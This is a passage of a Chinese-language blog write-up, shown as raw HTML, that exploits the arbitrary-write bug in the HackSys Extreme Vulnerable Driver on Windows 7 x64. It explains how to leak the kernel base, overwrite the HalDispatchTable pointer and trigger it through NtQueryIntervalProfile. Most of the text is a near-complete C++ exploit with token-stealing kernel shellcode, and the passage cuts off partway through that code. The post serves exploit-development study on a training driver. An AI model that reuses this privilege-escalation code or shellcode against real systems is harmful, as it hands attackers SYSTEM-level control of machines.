ProbeForRead(UserWriteWhatWhere, <span class="hljs-number">0x10</span>ui64, <span class="hljs-number">1u</span>);  What = UserWriteWhatWhere-&gt;What;  Where = UserWriteWhatWhere-&gt;Where;  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%X\n&quot;</span>, <span class="hljs-number">16</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);  *Where = *What;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>输入<code>0x10</code>个字节，把<code>what</code>上的内容赋到<code>where</code>地址上</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>为了能最后提权，我们应该做什么</p><p>找个内核的地方写？<br>=&gt; 需要知道内核地址<br>=&gt; 通过 <code>NtQuerySystemInformation/ZwQuerySystemInformation</code> 接口获取内核的基地址<br>=&gt; 通过基地址+偏移获取在内核中的地址</p><p>写什么地方？<br>=&gt; 内核中的函数指针<br>=&gt; 那这个函数指针对应的接口应该有什么特征呢？<br>=&gt; 应该较少被内核调用，否则被其他地方调用了，就可能导致内核崩溃 &amp;&amp; 可以通过用户态的一个接口进行调用，从而触发对函数指针的调用<br>=&gt; 找到<code>HalDispatchTable</code>中偏移为<code>0x8</code>位置的<code>xHalSetSystemInformation</code>函数指针接口完美符合，上层可由<code>NtQueryIntervalProfile</code>或<code>NtSetIntervalProfile</code>调用</p><p>（P.S. 这里的思路可参考这个<a href="https://shinnai.altervista.org/papers_videos/ECFID.pdf">ECFID.pdf</a> ）</p><p>整个流程类似下图，在用户空间写的进程，先通过任意地址写漏洞修改了<code>HalDispatchTable</code>，然后通过用户态的接口调用<code>NtQueryIntervalProfile</code>，从而使用了<code>xHalQuerySysttemInformation</code>这个函数指针，最后跳转到<code>shellcode</code>上</p><p><img src="/image/HEVD%20win7%20x64%20arbitrary%20write/QQ%E6%88%AA%E5%9B%BE20220628204429.png" alt="流程图"></p><p>这里说明一下<code>Nt* | ZW*</code>区别</p><ol><li>在<code>ntdll.dll</code>中，<code>Nt*</code>和<code>Zw*</code>应该是没区别，这个是跑在<code>ring3</code>的</li><li>在<code>ntoskrnl</code>中，<code>Nt*</code>和<code>Zw*</code>都是跑在<code>ring0</code>。<code>Nt*</code>是该接口的具体实现，绕过了<code>SSDT</code>，而<code>Zw*</code>是通过<code>SSDT</code>的<code>KiSystemService</code>调用<code>ntoskrnl</code>中的<code>Nt*</code>函数（我通过<code>uf</code>看的汇编的流程是，<code>nt!Zw*</code>-&gt;<code>nt!KiServiceInternal</code>-&gt;<code>nt!KiSystemServiceStart</code>）</li></ol><p>这部分的区别参考以下博客<a href="https://blog.csdn.net/SysProgram/article/details/5805265">1</a>，<a href="https://blog.csdn.net/shenjianxz/article/details/52704046">2</a>，<a href="https://blog.csdn.net/evi10r/article/details/6742052">3</a>，<a href="https://codeantenna.com/a/fsxdbtaiWL">4</a>，<a href="https://blog.csdn.net/SysProgram/article/details/5805265">5</a></p><p>关于<code>SSDT</code>的说明，有<a href="https://bbs.pediy.com/thread-177772.htm">1</a>，<a href="https://bbs.pediy.com/thread-84946-1.htm">2</a>，<a href="https://www.anquanke.com/post/id/262577">3</a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>整个流程应该为</p><ol><li><code>GetKernelBaseSystemModule</code>：通过<code>NtQuerySystemInformation/ZwQuerySystemInformation</code>接口获取<code>SYSTEM_MODULE</code>，从而获取内核的基址</li><li><code>GetHalDispatchTableAddress</code>：通过基址找到<code>HalDispatchTable</code>在内核中的地址，从而找到<code>xHalSetSystemInformation</code>这一函数指针的地址，即<code>Where</code></li><li><code>Perpare</code>：准备<code>shellcode</code>，以及与驱动进行交互，进行任意地址写</li><li><code>TriggerShellcode</code>：通过用户态的<code>ntdll</code>的<code>NtQueryIntervalProfile</code>接口执行<code>shellcode</code>并正常返回</li><li><code>start cmd</code>：起一个提权的<code>cmd</code></li></ol><h3 id="GetKernelBaseSystemModule"><a href="#GetKernelBaseSystemModule" class="headerlink" title="GetKernelBaseSystemModule"></a>GetKernelBaseSystemModule</h3><p>第一次调用<code>ntdll.ZwQuerySystemInformation(0xb, NULL, 0, &amp;len)</code>可以得到一个<code>error</code>的结果，但是会在<code>len</code>上返回一个该查询会得到的结构体大小（P.S. 第一次<code>len</code>指向<code>0</code>）</p><p>第二次调用<code>ntdll.ZwQuerySystemInformation</code>，把正确的大小（<code>len</code>）和空间（<code>PModuleInfo</code>）输入进去，即可得到<code>SYSTEM_MODULE</code>的信息，<code>ntdll.ZwQuerySystemInformation(0xb, PModuleInfo, len, &amp;len)</code></p><p>在<code>PModuleInfo</code>这个结构体是由<code>ULONG ModulesCount</code>和<code>SYSTEM_MODULE Modules[ModulesCount]</code>数组组成的，前一项表示存在多少项<code>SYSTEM_MODULE</code>，之后就是每个<code>SYSTEM_MODULE</code>的详细信息</p><p>在这里可以通过<code>module.Name</code>是否为<code>ntoskrnl</code>从而得到<code>ImageBaseAddress</code>（P.S. 但是从<a href="https://www.anquanke.com/post/id/246289">Gcow exp</a>和我自己写完<code>exp</code>跑完的结果来看，这个<code>ntoskrnl.exe</code>一直是第一项）</p><p>这个地方的获取基址，这篇 <a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">Windows取内核中的函数</a> 讲得特别清楚</p><p>（P.S. 我在这里踩了一个坑，就是<code>struct SYSTEM_MODULE</code>，里面写每个属性时，没把<code>ULONG</code>写成带数字的，当时我查了一下<code>ULONG</code>默认是<code>8</code>字节，结果最后打印项的时候发现不对）</p><h3 id="GetHalDispatchTableAddress"><a href="#GetHalDispatchTableAddress" class="headerlink" title="GetHalDispatchTableAddress"></a>GetHalDispatchTableAddress</h3><p>通过得到的<code>SYSTEM_MODULE</code>，经过<code>userland_HalDispatchTable - uerland_base + kernel_base</code>就可以得到<code>HalDispatchTable</code>在内核中的地址了</p><h3 id="TriggerShellcode"><a href="#TriggerShellcode" class="headerlink" title="TriggerShellcode"></a>TriggerShellcode</h3><p>因为是通过上层<code>ntdll</code>的<code>api</code>去调用底层的<code>xHalSetSystemInformation</code>地址上的函数指针，就需要查看这个调用链上的情况</p><p>在<code>ntoskrnl.exe</code>中可以利用<code>windbg</code>下载的<code>.pdb</code>得到符号，从而直接找到<code>NtQueryIntervalProfile</code>的地址</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">NtQueryIntervalProfile</span><span class="hljs-params">(KPROFILE_SOURCE ProfileSource, PULONG Interval)</span></span><span class="hljs-function"></span>&#123;  PULONG v2; <span class="hljs-comment">// rbx</span>  v2 = Interval;  <span class="hljs-keyword">if</span> ( KeGetCurrentThread()-&gt;PreviousMode )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)Interval &gt;= MmUserProbeAddress )      Interval = (PULONG)MmUserProbeAddress;    *Interval = *Interval;  &#125;  *v2 = KeQueryIntervalProfile(ProfileSource);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>可以看到第一个函数的接口部分，没什么需要设置的（P.S. 我就使<code>Interval</code>是个可读写的地址）</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KeQueryIntervalProfile</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-18h] BYREF</span>  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+24h] [rbp-14h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+40h] [rbp+8h] BYREF</span>  <span class="hljs-keyword">if</span> ( !a1 )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileInterval;  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">1</span> )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileAlignmentFixupInterval;  v2 = a1;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)((__int64 (__fastcall *)(__int64, __int64, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">char</span> *))off_1401E2CF8)(<span class="hljs-number">1</span>i64, <span class="hljs-number">12</span>i64, &amp;v2, &amp;v5) &gt;= <span class="hljs-number">0</span> &amp;&amp; v3 )    <span class="hljs-keyword">return</span> v4;  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>第二个函数，需要传进来的<code>ProfileSource</code>不能为<code>0</code>和<code>1</code>，因此我设置为<code>2</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>最终版</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE</span> &#123;</span>    ULONG64 Reserved1;    ULONG64 Reserved2;    ULONG64 ImageBaseAddress;    ULONG32 ImageSize;    ULONG32 Flags;    USHORT Id;    USHORT Rank;    USHORT LoadCount;    USHORT NameOffset;    CHAR Name[<span class="hljs-number">256</span>];&#125; SYSTEM_MODULE, * PSYSTEM_MODULE;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE_INFORMATION</span> &#123;</span>    ULONG ModulesCount;    SYSTEM_MODULE Modules[<span class="hljs-number">1</span>];&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _SYSTEM_INFORMATION_CLASS &#123;    SystemModuleInformation = <span class="hljs-number">0xB</span>&#125; SYSTEM_INFORMATION_CLASS;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PZwQuerySystemInformation)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><span class="hljs-function"><span class="hljs-params">    __inout PVOID SystemInformation,</span></span><span class="hljs-function"><span class="hljs-params">    __in ULONG SystemInformationLength,</span></span><span class="hljs-function"><span class="hljs-params">    __out_opt PULONG ReturnLength</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PNtQueryIntervalProfile)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in INT32 ProfileSource,</span></span><span class="hljs-function"><span class="hljs-params">    __in PULONG * Interval</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function">SYSTEM_MODULE <span class="hljs-title">GetKernelBaseSystemModule</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// Using NtQuerySystemInformation/ZwQuerySystemInformation Interface to get kernel image base</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(SYSTEM_MODULE) != <span class="hljs-number">0x128</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] struct SYSTEM_MODULE Error&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// Load ntdll.dll</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    <span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Load Ntdll Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get NtQuerySystemInformation/ZwQuerySystemInformation address</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get ZwQuerySystemInformation Address&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Failed to Get the Address of NtQuerySystemInformation&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Last Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get Buffer Length</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get Buffer Length&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG len = <span class="hljs-number">0</span>;    <span class="hljs-comment">// the API Call ends in an error, but we can get the correct Length in ReturnLength </span>    ZwQuerySystemInformation(SystemModuleInformation, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;len);    <span class="hljs-comment">// Allocate Memory</span>    PSYSTEM_MODULE_INFORMATION PModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(<span class="hljs-literal">NULL</span>, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    <span class="hljs-comment">// Get SYSTEM_MODULE_INFORMATION</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get SYSTEM_MODULE_INFORMATION&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, PModuleInfo, len, &amp;len);    <span class="hljs-keyword">switch</span> (Status)    &#123;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0x0</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] NtQuerySystemInformation Sucess&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000004</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000005</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">default</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Module Count: &quot;</span> &lt;&lt; PModuleInfo-&gt;ModulesCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    INT32 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (i &lt; PModuleInfo-&gt;ModulesCount)    &#123;        SYSTEM_MODULE CurrentSM = PModuleInfo-&gt;Modules[i];        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Log System Module:&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved1 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved1 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved2 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved2 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageBaseAddress 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageBaseAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageSize 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageSize &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Flags 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Flags &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Id 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Id &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Rank 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Rank &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- LoadCount 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.LoadCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- NameOffset 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.NameOffset &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Name &quot;</span> &lt;&lt; CurrentSM.Name &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntoskrnl&quot;</span>) || <span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntkrnl&quot;</span>))        &#123;            <span class="hljs-keyword">return</span> CurrentSM;        &#125;        i += <span class="hljs-number">1</span>;    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Can not find&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);&#125;<span class="hljs-function">ULONG64 <span class="hljs-title">GetHalDispatchTableAddress</span><span class="hljs-params">(SYSTEM_MODULE SM)</span></span><span class="hljs-function"></span>&#123;    CHAR NtName[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;    <span class="hljs-built_in">strncpy</span>(NtName, <span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>));    HMODULE hNtkrnl = LoadLibraryA(NtName);    <span class="hljs-keyword">if</span> (hNtkrnl == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open &quot;</span> &lt;&lt; NtName &lt;&lt; <span class="hljs-string">&quot; Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    ULONG64 userlandHal = (ULONG64)GetProcAddress(hNtkrnl, <span class="hljs-string">&quot;HalDispatchTable&quot;</span>);    ULONG64 kernelHal = userlandHal - (ULONG64)hNtkrnl + SM.ImageBaseAddress;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] HalDispatchTable: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; kernelHal &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    HalDispatchTable:</span><span class="hljs-comment">    1: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 fffff800`044148e8</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment"></span><span class="hljs-comment">    1: kd&gt; uf fffff800`044148e8</span><span class="hljs-comment">    hal!HaliQuerySystemInformation:</span><span class="hljs-comment">    fffff800`044148e8 fff3            push    rbx</span><span class="hljs-comment">    fffff800`044148ea 55              push    rbp</span><span class="hljs-comment">    fffff800`044148eb 56              push    rsi</span><span class="hljs-comment">    fffff800`044148ec 57              push    rdi</span><span class="hljs-comment">    fffff800`044148ed 4154            push    r12</span><span class="hljs-comment">    */</span>    <span class="hljs-keyword">return</span> kernelHal;&#125;<span class="hljs-function">VOID <span class="hljs-title">TriggerShellcode</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; uf NtQueryIntervalProfile</span><span class="hljs-comment">    ntdll!NtQueryIntervalProfile:</span><span class="hljs-comment">    00000000`77b7aa80 4c8bd1          mov     r10,rcx</span><span class="hljs-comment">    00000000`77b7aa83 b81d010000      mov     eax,11Dh</span><span class="hljs-comment">    00000000`77b7aa88 0f05            syscall</span><span class="hljs-comment">    00000000`77b7aa8a c3              ret</span><span class="hljs-comment">    0: kd&gt; uf nt!NtQueryIntervalProfile</span><span class="hljs-comment">    nt!NtQueryIntervalProfile:</span><span class="hljs-comment">    fffff800`041b7940 48895c2408      mov     qword ptr [rsp+8],rbx</span><span class="hljs-comment">    fffff800`041b7945 57              push    rdi</span><span class="hljs-comment">    fffff800`041b7946 4883ec20        sub     rsp,20h</span><span class="hljs-comment">    fffff800`041b794a 488bda          mov     rbx,rdx</span><span class="hljs-comment">    */</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    PNtQueryIntervalProfile NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtQueryIntervalProfile&quot;</span>);    PULONG null = <span class="hljs-number">0</span>;    NtQueryIntervalProfile(<span class="hljs-number">2</span>, &amp;null);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open HackSysExtremeVulnerableDriver Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Device Handle: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; dev &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    SYSTEM_MODULE KBSM = GetKernelBaseSystemModule();    ULONG64 HalDispatchTable = GetHalDispatchTableAddress(KBSM);    CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret: return to func KeQueryIntervalProfile </span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span 